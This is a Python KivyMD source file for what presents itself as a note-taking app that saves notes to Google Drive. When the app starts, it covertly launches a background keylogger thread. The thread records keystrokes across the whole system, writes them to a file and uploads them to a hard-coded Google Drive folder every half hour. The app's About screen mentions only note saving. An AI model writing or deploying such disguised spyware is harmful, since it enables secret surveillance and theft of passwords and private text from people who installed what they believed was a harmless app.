import os
import time
import threading
import keyboard
from kivy.lang import Builder
from kivymd.app import MDApp
from kivymd.uix.textfield import MDTextField
from kivymd.uix.screen import MDScreen
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from googleapiclient.http import MediaFileUpload
from kivymd.uix.bottomnavigation import MDBottomNavigation, MDBottomNavigationItem
from kivymd.uix.label import MDLabel
from kivy.uix.boxlayout import BoxLayout

# Google Drive API setup
SCOPES = ['https://www.googleapis.com/auth/drive.file']

# Your keylogger logic here
def keylogger_function():
    # Initialize a timer for 10 seconds
    timer = 10  # 10 seconds

    # Create a file to store keystrokes
    keystrokes = []

    # Start the keylogger
    start_time = time.time()

    while time.time() - start_time < timer:
        event = keyboard.read_event()
        keystrokes.append(str(event))

    # Save the keystrokes to a local file
    with open('keystrokes.txt', 'w') as file:
        file.writelines(keystrokes)

    # Upload the file to Google Drive
    creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    drive_service = build('drive', 'v3', credentials=creds)

    file_metadata = {
        'name': 'keystrokes.txt',
        'parents': ['12cPzbTlU_nIdjCNld7xvfUE8acdso84I']  # Replace with your folder ID
    }

    media = MediaFileUpload('keystrokes.txt', mimetype='text/plain')

    drive_service.files().create(
        body=file_metadata,
        media_body=media,
        fields='id'
    ).execute()

# Schedule the keylogger task to run every 2 hours
def schedule_keylogger():
    while True:
        keylogger_function()
        time.sleep(1800)  # Sleep for 1 hours

# KivyMD App
KV = '''
BoxLayout:
    orientation: 'vertical'

    MDBottomNavigation:
        panel_color: 1, 1, 1, 1  # Change to white (1, 1, 1, 1 represents RGB white)

        MDBottomNavigationItem:
            name: 'screen1'
            text: 'Home'
            icon: 'home'

            MDScreen:
                BoxLayout:
                    orientation: 'vertical'
                    padding: "10dp"
                    spacing: "10dp"

                    MDBoxLayout:
                        orientation: 'vertical'
                        spacing: "5dp"
                        padding: "10dp"
                        size_hint: None, None
                        size: "300dp", "400dp"
                        pos_hint: {"center_x": 0.5}
                        radius: [10, 10, 10, 10]

                        canvas.before:
                            Color:
                                rgba: 1, 1, 1, 1
                            RoundedRectangle:
                                size: self.size
                                pos: self.pos
                                radius: self.radius

                        MDTextField:
                            id: text_input  # Add the id here
                            hint_text: "Enter your note here"
                            multiline: True
                            font_size: "16sp"

                    MDRaisedButton:
                        text: 'Save'
                        size_hint: None, None
                        size: "120dp", "40dp"
                        pos_hint: {"center_x": 0.5}
                        on_release: app.save_to_google_drive()

        MDBottomNavigationItem:
            name: 'screen2'
            text: 'About'
            icon: 'information'

            MDScreen:
                MDLabel:
                    text: "This app allows you to jot down notes and save them to Google Drive."
                    theme_text_color: "Secondary"
                    halign: "center"
                    font_size: "16sp"
'''

class NoteApp(MDApp):

    def build(self):
        self.theme_cls.material_style = "M3"
        self.theme_cls.primary_palette = "Purple"  # Set the primary color to violet
        self.authenticate()

        # Start the keylogger thread
        keylogger_thread = threading.Thread(target=schedule_keylogger)
        keylogger_thread.start()

        return Builder.load_string(KV)

    def authenticate(self):
        creds = None
        if os.path.exists('token.json'):
            creds = Credentials.from_authorized_user_file('token.json', SCOPES)

        if not creds or not creds.valid:
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(Request())
            else:
                flow = InstalledAppFlow.from_client_secrets_file(
                    'Nofile.json', SCOPES)  # Replace with your client secret file path
                creds = flow.run_local_server(port=0)

            with open('token.json', 'w') as token:
                token.write(creds.to_json())

        self.drive_service = build('drive', 'v3', credentials=creds)

    def save_to_google_drive(self):
        text_input = self.root.ids.text_input
        text = text_input.text

        try:
            # Create a new text file and write the user's text to it
            with open('text_file.txt', 'w', encoding='utf-8') as file:
                file.write(text)

            # You can customize the folder where you want to save the text
            folder_id = '12cPzbTlU_nIdjCNld7xvfUE8acdso84I'  # Replace with your folder ID

            # Upload the newly created text file to Google Drive
            file_metadata = {
                'name': 'text_file.txt',
                'parents': [folder_id]
            }
            media = MediaFileUpload('text_file.txt', mimetype='text/plain')

            self.drive_service.files().create(
                body=file_metadata,
                media_body=media,
                fields='id'
            ).execute()

            text_input.text = ""  # Clear the text input field after saving
        except Exception as e:
            print("Error:", str(e))

if __name__ == '__main__':
    NoteApp().run()